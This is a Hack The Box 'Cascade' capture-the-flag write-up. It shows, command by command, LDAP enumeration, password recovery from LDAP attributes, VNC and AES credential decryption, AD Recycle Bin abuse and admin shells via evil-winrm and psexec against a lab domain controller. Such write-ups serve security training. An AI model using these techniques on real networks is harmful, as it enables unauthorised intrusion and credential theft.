---
layout: post
title: "Hack The Box - Cascade Writeup"
author: Chr0x6eOs
date: "2020-07-25"
subject: "Cascade Writeup"
keywords: [HTB, CTF, Hack The Box, Security, Chr0x6eOs, Windows, LDAP, Samba, VisualBasic, VNC, dotPeek, ILSpy, cryptography, DES, AES, AD Recycle Bin]
lang: "en"
image:
    path: assets/htb/Cascade/logo.png
    width: 300
    height: 300
...

# Overview
![Cascade](/assets/htb/Cascade/cascade.png)

[Cascade](https://www.hackthebox.eu/home/machines/profile/235) is a medium windows box by [VbScrub](https://www.hackthebox.eu/home/users/profile/158833).

The box starts with LDAP-enumeration, where we find a custom attribute that contains the user's password. Using the password, we can read data from an SMB-share. This share contains a registry-file for a VNC-config. Decrypting the password from the registry-file, we can login as user and read user.txt.

In order to get root, we have to decompile an VisualBasic executable and decrypt a password using the AES-parameters found in the executable. This gives as access to a user that is part of the AD Recycle Bin group, where we can restore a user with the admin-password set as an LDAP-attribute. Using the password we can get a shell as Administrator and read root.txt.

## Information Gathering

### Nmap
We begin our enumeration with a nmap scan for open ports.

```bash
root@darkness:~# nmap -sC -sV 10.10.10.182
Nmap scan report for 10.10.10.182
Host is up (0.046s latency).
Not shown: 986 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-23 12:54:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-07-23T12:55:43
|_  start_date: 2020-07-23T11:34:54
```

## Enumeration

We have quite a few ports open. However, Kerberos (**88**), LDAP (**389**) and SMB (**445**) are the most interesting ones. Nmap already gives us a bit of information about the domain by giving us the domain-name: **cascade.local**. Quickly checking out SMB, it seems like we do not have any access as an anonymous user. Let us therefore check out LDAP and see if we get any useful information.

### LDAP - Port 389

We can connect to the LDAP server using ldapsearch.

Using a simple query, we can get all entries of the LDAP server.

```bash
root@darkness:~# ldapsearch -x -b 'dc=cascade,dc=local' -h 10.10.10.182 "(objectclass=*)"
```

Looking through the output, we can see that there is an object class called `user`. Let us query all users and look through them to find anything that could be of interest for us.

```bash
root@darkness:~# ldapsearch -x -b 'dc=cascade,dc=local' -h 10.10.10.182 "(objectclass=user)"
[...]
# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
[...]
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
[...]
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
[...]
logonCount: 2
sAMAccountName: r.thompson
[...]
cascadeLegacyPwd: clk0bjVldmE=
```

Looking through all users, we get one user that has a unique attribute: `cascadeLegacyPwd`. Furthermore, the account has a logonCount greater than 0.

We can use another query to find all users that have logged in before.

```bash
root@darkness:~# ldapsearch -x -b 'dc=cascade,dc=local' -h 10.10.10.182 "(logonCount>=1)"
[...]
```

Or we can use grep to get the same result.

```bash
root@darkness:~# ldapsearch -x -b 'dc=cascade,dc=local' -h 10.10.10.182 "(objectclass=user)" | grep -E "logonCount: [1-9]" -A 1
logonCount: 5296
sAMAccountName: CASC-DC1$
--
logonCount: 13
sAMAccountName: arksvc
--
logonCount: 16
sAMAccountName: s.smith
--
logonCount: 2
sAMAccountName: r.thompson
--
logonCount: 1
sAMAccountName: util
```

Let us now focus on the `cascadeLegacyPwd` attribute. Filtering for the attribute, we only get one result: `r.thompson`.

```bash
root@darkness:~# ldapsearch -x -b 'dc=cascade,dc=local' -h 10.10.10.182 "(cascadeLegacyPwd=*)"
[...]
# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
[...]
```

The value of the attribute seems to be base64-encoded data. Let us quickly decode the string:

```bash
root@darkness:~# echo -n 'clk0bjVldmE=' | base64 -d
rY4n5eva
```

Looks like a possible password-candidate. The name cascadeLecacy**P**ass**W**or**D** also reinforces this theory.

Let us check this password against SMB.

```bash
root@darkness:~# crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva
```

Seems like we got a valid password! Let us enumerate SMB now that we have credentials.

### SMB - Port 445

Now that we have a valid set of credentials, we can start enumerating the SMB-shares of the server.

```bash
root@darkness:~# smbclient -L //10.10.10.182// -U 'cascade.local\r.thompson'
Enter CASCADE.LOCAL\r.thompson password: rY4n5eva

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Audit$          Disk      
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        print$          Disk      Printer Drivers
        SYSVOL          Disk      Logon server share
```

Both the `Audit$` and the `Data` share seem very interesting. We could have also used smbmap to list these shares.

```bash
root@darkness:~# smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva -d cascade.local
[+] IP: 10.10.10.182:445        Name: 10.10.10.182                                      
        Disk                    Permissions     Comment
        ----                    -----------     -------
        ADMIN$                  NO ACCESS       Remote Admin
        Audit$                  NO ACCESS
        C$                      NO ACCESS       Default share
        Data                    READ ONLY
        IPC$                    NO ACCESS       Remote IPC
        NETLOGON                READ ONLY       Logon server share 
        print$                  READ ONLY       Printer Drivers
        SYSVOL                  READ ONLY       Logon server share
```

Smbmap in addition to listing the shares, also gives us information about our permissions for each share. This shows that we do not have access to the `Audit$` share.

Now that we know that the only interesting share we can access is `Data` , let us enumerate this share. To ease enumeration, let us mount the smb-share to our system.

```bash
root@darkness:~# mkdir /mnt/cascade; mount -o user=r.thompson -t cifs //10.10.10.182/Data /mnt/cascade
Password for r.thompson@//10.10.10.182/Data:  ********
```

Now that the share is successfully mounted, we can use `find` to list all files, that we can access.

```bash
root@darkness:/mnt/cascade# find . 2>/dev/null
.
./Contractors
./Finance
./IT
./IT/Email Archives
./IT/Email Archives/Meeting_Notes_June_2018.html
./IT/LogonAudit
./IT/Logs
./IT/Logs/Ark AD Recycle Bin
./IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log
./IT/Logs/DCs
./IT/Logs/DCs/dcdiag.log
./IT/Temp
./IT/Temp/r.thompson
./IT/Temp/s.smith
./IT/Temp/s.smith/VNC Install.reg
./Production
./Temps
```

Seems like we have access to a notes file, some logs and a registry file. 

Viewing the html file using firefox, we get following output:

```bash
root@darkness:/mnt/cascade# firefox "IT/Email Archives/Meeting_Notes_June_2018.html"
```

![Email](/assets/htb/Cascade/mail.png)

Seems like there is a user called `TempAdmin` that has the same password as the normal admin and may be already deleted. If we are able to get the password of the TempAdmin user, we may be able to escalate to the real admin account.

```bash
root@darkness:/mnt/cascade# cat "IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log"
1/10/2018 15:43 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
1/10/2018 15:43 [MAIN_THREAD]   Validating settings...
1/10/2018 15:43 [MAIN_THREAD]   Error: Access is denied
1/10/2018 15:43 [MAIN_THREAD]   Exiting with error code 5
2/10/2018 15:56 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
2/10/2018 15:56 [MAIN_THREAD]   Validating settings...
2/10/2018 15:56 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
2/10/2018 15:56 [MAIN_THREAD]   Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Exiting with error code 0
8/12/2018 12:22 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22 [MAIN_THREAD]   Validating settings...
8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
```

The `ArkAdRecycleBin.log` shows, that the TempAdmin user has been moved to the `AD recycle bin`, which verifies our assumption that the user was deleted.

The file `./IT/Logs/DCs/dcdiag.log` simply shows the current status of the Domain-Controller and does not have any information that is too interesting for us.

Finally, let us take a look at the registry file.

```bash
root@darkness:/mnt/cascade# cat "IT/Temp/s.smith/VNC Install.reg"
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""
```

Seems like the server in use is `TightVNC`. Furthermore, there is an encrypted password: `"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f`.

### Extracting the VNC-password

We have multiple ways to decrypt the VNC-password. According to this [GitHub](https://github.com/frizb/PasswordDecrypts), we can decrypt the password by using a fixed key of `\x17\x52\x6b\x06\x23\x4e\x58\x07`.

```ruby
msf5 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> 
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
>> require 'rex/proto/rfb'
=> true
>> Rex::Proto::RFB::Cipher.decrypt["6BCF2A4B6E5ACA0F"].pack('H*'), fixedkey
=> "sT333ve2"
```

We can also use this [implementation](http://aluigi.org/pwdrec/vncpwd.zip). We can either run this in windows or use wine to emulate a windows environment.

Using windows:

![Decrypting pw](/assets/htb/Cascade/decrypt.png)

Using wine on linux:

```bash
root@darkness:~# wine vncpwd.exe 6BCF2A4B6E5ACA0F

*VNC password decoder 0.2.1
by Luigi Auriemma
e-mail: aluigi@autistici.org
web:    aluigi.org

- your input password seems in hex format (or longer than 8 chars)

  Password:   sT333ve2

  Press RETURN to exit
```



Looking at the implementation, we can see that all the program does is DES-decrypting the password with a fixed key (same as we did using ruby).

```bash
root@darkness:~# cat vncpwd.c | grep fixedkey
    uint8_t fixedkey[8] = { 23,82,107,6,35,78,88,7 },
    deskey(fixedkey, DE1);
```



## User-shell

Now that we have decrypted the password `sT333ve2` for the user `s.smith`, we can use evil-winrm to get a shell.

```powershell
root@darkness:~# evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\s.smith\Documents>
```

Now that we have a shell as the user, we can read user.txt.

```powershell
*Evil-WinRM* PS C:\Users\s.smith\Desktop> type user.txt
4cbc8***************************
```



## Privesc

Now that we have a shell as user, let us enumerate the system to find a privilege escalation-vector.

### Enumeration as s.smith

Let us check out smb again with the new set of credentials and see if we now have access to the `Audit$` share.

```bash
root@darkness:~# smbmap -H 10.10.10.182 -u s.smith -p sT333ve2
[+] IP: 10.10.10.182:445        Name: 10.10.10.182                                      
        Disk                    Permissions     Comment
        ----                    -----------     -------
        ADMIN$                  NO ACCESS       Remote Admin
        Audit$                  READ ONLY
        C$                      NO ACCESS       Default share
[...]
```

Seems like we have access to the `Audit$` share. Let us mount the share again.

```bash
root@darkness:~# umount /mnt/cascade; mount -o user=s.smith -t cifs //10.10.10.182/Audit\$ /mnt/cascade
Password for s.smith@//10.10.10.182/Audit$:  ********
```

Now that we have mounted the share, let us look into the files we have access to.

```bash
root@darkness:/mnt/cascade# find .
.
./CascAudit.exe
./CascCrypto.dll
./DB
./DB/Audit.db
./RunAudit.bat
./System.Data.SQLite.dll
./System.Data.SQLite.EF6.dll
./x64
./x64/SQLite.Interop.dll
./x86
./x86/SQLite.Interop.dll
```

We have a couple of interesting files here.

```bash
root@darkness:/mnt/cascade# cat ./RunAudit.bat
CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
```

Seems like the `CascAudit.exe` is run with the `Audit.db` file as an argument. Let us view the Audit.db file.

```bash
root@darkness:/mnt/cascade# file DB/Audit.db
DB/Audit.db: SQLite 3.x database, last written using SQLite version 3027002
sqlite3 DB/Audit.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
DeletedUserAudit  Ldap  Misc
sqlite> select * from Ldap
   ...> ;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```

Seems like we have another password, however Base64-decrypting the password does not give any useful output.

```bash
echo -n BQO5l5Kj9MdErXx6Q6AGOw== | base64 -d
D|zC;
```

Let us decompile `CascAudit.exe` using either [dotPeek](https://www.jetbrains.com/decompiler/) or [ILSpy](https://github.com/icsharpcode/ILSpy).

### Decompiling CascAudit.exe

Opening the file in dotPeek, we can look a the source code of the exe.

![Password](/assets/htb/Cascade/dotpeek-pw.png)

We can see that the program is opening the SQLite file and reads the users. Then it tries to decrypt the password (str2) in this line:

```vb
str1 = Crypto.DecryptString(str2, "c4scadek3y654321");
```

Let us open the `CascCrypto.dll` file next to get the other crypto-parameters we need.

Looking at the `Crypto.cs` class, we can see that the password is encrypted using AES in CBC mode.

![Decrypt function](/assets/htb/Cascade/dotpeek-decrypt.png)

Similar to Nest, we can either use CyberChef or VB to decode the password. As I have already showed this in my [Nest writeup](https://chr0x6eos.github.io/2020/06/06/htb-Nest.html) I'll won't go into much detail here again. Let us simply decrypt the password using CyberChef.

### Decrypting the AES-encrypted password

Now that we have the IV (`1tdyjCbY1Ix49842`), the key (`c4scadek3y654321`) and the mode (`CBC`), we can quickly decrypt the ciphertext using CyberChef with [this recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)AES_Decrypt(%7B'option':'UTF8','string':'c4scadek3y654321'%7D,%7B'option':'UTF8','string':'1tdyjCbY1Ix49842'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)&input=QlFPNWw1S2o5TWRFclh4NlE2QUdPdz09).

![CyberChef decrypt](/assets/htb/Cascade/cyberchef-decrypt.png)

Running CyberChef we get the password: `w3lc0meFr31nd`.

Let us verify that the password works for the user `arksvc`.

```bash
root@darkness:~# crackmapexec smb 10.10.10.182 -u arksvc -p w3lc0meFr31nd
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd
```

Seems like the password is correct! Let us enumerate the system with the arksvc user.

### Enumeration as arksvc

Now that we have a set of working credentials, let us further enumerate the system.

```powershell
root@darkness:~# evil-winrm -i 10.10.10.182 -u arksvc -p w3lc0meFr31nd

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\arksvc\Documents>
```

Let us check out the privileges and groups of the user.

```powershell
*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type            
=========================================== ================
Everyone                                    Well-known group
BUILTIN\Users                               Alias           
BUILTIN\Pre-Windows 2000 Compatible Access  Alias           
NT AUTHORITY\NETWORK                        Well-known group
NT AUTHORITY\Authenticated Users            Well-known group
NT AUTHORITY\This Organization              Well-known group
CASCADE\Data Share                          Alias           
CASCADE\IT                                  Alias           
CASCADE\AD Recycle Bin                      Alias           
CASCADE\Remote Management Users             Alias           
NT AUTHORITY\NTLM Authentication            Well-known group
Mandatory Label\Medium Plus Mandatory Level Label
```

Looking at our groups, we find that we are part of the `CASCADE\AD Recycle Bin` group.

As we are part of this group, we can recover the deleted `TempAdmin` account and possibly get his password this way.

### Recovering the admin account from AD Recycle bin

Using a simple query, we can quickly view the deleted user.

```powershell
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted Objects" -and samaccountname -eq "TempAdmin"' -includeDeletedObjects -property *
[...]
cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz
CN               : TempAdmin
[...]
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
[...]
```

Seems like this account also has the `cascadeLegacyPwd` set. Let us decode the password and try it for the admin account.

```bash
root@darkness:~# echo -n YmFDVDNyMWFOMDBkbGVz | base64 -d
baCT3r1aN00dles
```

## Admin-Shell

Using the found password `baCT3r1aN00dles` we can now try to login as admin using either `psexec` or `evil-winrm` .

```bash
root@darkness:~# psexec.py cascade.local/administrator:baCT3r1aN00dles@10.10.10.182
Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.182.....
[*] Found writable share ADMIN$
[*] Uploading file TzMOycRi.exe
[*] Opening SVCManager on 10.10.10.182.....
[*] Creating service SVsq on 10.10.10.182.....
[*] Starting service SVsq.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

```powershell
root@darkness:~# evil-winrm -i 10.10.10.182 -u administrator -p baCT3r1aN00dles

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

We successfully get a shell as Administrator and can read root.txt.

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
b029f***************************
```

